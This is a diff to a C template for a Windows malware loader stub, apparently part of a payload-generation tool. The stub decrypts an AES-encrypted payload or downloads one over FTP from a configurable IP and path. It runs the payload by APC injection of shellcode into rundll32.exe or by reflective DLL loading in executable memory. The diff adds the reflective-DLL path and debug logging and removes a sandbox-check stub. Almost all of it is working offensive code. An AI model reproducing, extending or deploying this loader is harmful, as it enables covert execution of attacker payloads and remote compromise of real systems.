@@ -2,20 +2,41 @@
 #include <tlhelp32.h>
 #include <bcrypt.h>
 #include <string.h>
+#include "ReflectiveLoader.h"
+#include <stdio.h>
+
+#ifdef DEBUG
+  // variadic macro that works even if you pass only fmt
+  #define DBG(fmt, ...) do {                                    \
+      char _dbgbuf[256];                                         \
+      snprintf(_dbgbuf, sizeof(_dbgbuf), fmt, ##__VA_ARGS__);   \
+      OutputDebugStringA(_dbgbuf);                               \
+  } while(0)
+#else
+  #define DBG(fmt, ...) do { } while(0)
+#endif
 
 #pragma comment(lib, "bcrypt.lib")
 
 typedef void* HINTERNET;
 typedef unsigned short INTERNET_PORT;
+
 #define INTERNET_DEFAULT_FTP_PORT 21
 #define INTERNET_SERVICE_FTP 1
 #define INTERNET_FLAG_PASSIVE 0x08000000
-
-#ifdef GENERIC_READ
-#undef GENERIC_READ
-#endif
-#define GENERIC_READ 0x80000000
 #define FTP_TRANSFER_TYPE_BINARY 0x00000002
+#ifndef GENERIC_READ
+#define GENERIC_READ 0x80000000
+#endif
+
+#ifndef DLLMAIN
+typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
+#endif
+
+typedef HMODULE(WINAPI* tLoadLibA)(LPCSTR);
+typedef FARPROC(WINAPI* tGetProcA)(HMODULE, LPCSTR);
+tLoadLibA pLoadLibA;
+tGetProcA pGetProcA;
 
 unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
 size_t payload_len = {{PAYLOAD_SIZE}};
@@ -29,42 +50,28 @@ wchar_t IP[64] = L"{{IP}}";
 wchar_t PATH[128] = L"{{PATH}}";
 short PORT = {{PORT}};
 
-typedef HMODULE(WINAPI* tLoadLibA)(LPCSTR);
-typedef FARPROC(WINAPI* tGetProcA)(HMODULE, LPCSTR);
-tLoadLibA pLoadLibA;
-tGetProcA pGetProcA;
-
-int is_sandbox_user() { return 0; }
-
 void decrypt_payload(unsigned char *buf, size_t len) {
     if (strcmp(enc_algo, "aes") != 0) return;
-
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     NTSTATUS status;
     DWORD cbKeyObject = 0, cbData = 0, cbResult = 0;
     PUCHAR pbKeyObject = NULL;
-
     unsigned char key_material[16] = {0};
     size_t key_len = strlen(key);
     for (int i = 0; i < 16; i++) key_material[i] = (i < key_len) ? key[i] : 0;
     unsigned char iv[16] = {0};
-
     status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status)) return;
     status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
     if (!BCRYPT_SUCCESS(status)) goto cleanup;
     status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
     if (!BCRYPT_SUCCESS(status)) goto cleanup;
-
     pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
     if (!pbKeyObject) goto cleanup;
-
     status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key_material, 16, 0);
     if (!BCRYPT_SUCCESS(status)) goto cleanup;
-
     BCryptDecrypt(hKey, buf, len, NULL, iv, sizeof(iv), buf, len, &cbData, 0);
-
 cleanup:
     if (hKey) BCryptDestroyKey(hKey);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -129,6 +136,16 @@ int download_payload() {
     return 1;
 }
 
+void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
+    LPVOID dll_mem = VirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!dll_mem) return;
+    memcpy(dll_mem, dll_buf, dll_len);
+    DWORD offset = GetReflectiveLoaderOffset(dll_mem);
+    if (!offset) return;
+    DLLMAIN entry = (DLLMAIN)((ULONG_PTR)dll_mem + offset);
+    entry((HINSTANCE)dll_mem, DLL_PROCESS_ATTACH, NULL);
+}
+
 void inject_APC(unsigned char *sc, size_t l) {
     char str_target[] = "C:\\Windows\\System32\\rundll32.exe";
 
@@ -152,25 +169,38 @@ void inject_APC(unsigned char *sc, size_t l) {
 }
 
 int main() {
-    pLoadLibA = (tLoadLibA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-    pGetProcA = (tGetProcA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
-    if (!pLoadLibA || !pGetProcA) return -1;
-
-    if (is_sandbox_user()) return 0;
-
+    DBG("[*] stub: entry\n");
     unsigned char *buf = payload;
     size_t len = payload_len;
 
     if (wcslen(IP) > 0 && PATH[0] != 0) {
-        if (!download_payload()) return -1;
+        DBG("[*] stub: downloading payload from %ls:%d / %ls\n", IP, PORT, PATH);
+        pLoadLibA = (tLoadLibA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+        pGetProcA = (tGetProcA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
+        if (!download_payload()) {
+            DBG("[!] stub: download_payload failed\n");
+            return -1;
+        }
+        DBG("[*] stub: downloaded %zu bytes\n", payload_len);
         buf = payload_ptr;
         len = payload_len;
     }
 
+    DBG("[*] stub: decrypting payload (len=%zu)\n", len);
     decrypt_payload(buf, len);
+    DBG("[*] stub: decrypt complete\n");
 
-    if (strcmp(payload_type, "shellcode") == 0)
+    if (strcmp(payload_type, "dll") == 0) {
+        DBG("[*] stub: executing reflective DLL\n");
+        execute_reflective_dll(buf, len);
+        DBG("[*] stub: execute_reflective_dll returned\n");
+    }
+    else if (strcmp(payload_type, "shellcode") == 0) {
+        DBG("[*] stub: injecting shellcode via APC\n");
         inject_APC(buf, len);
+        DBG("[*] stub: inject_APC returned\n");
+    }
 
+    DBG("[*] stub: exit normally\n");
     return 0;
 }
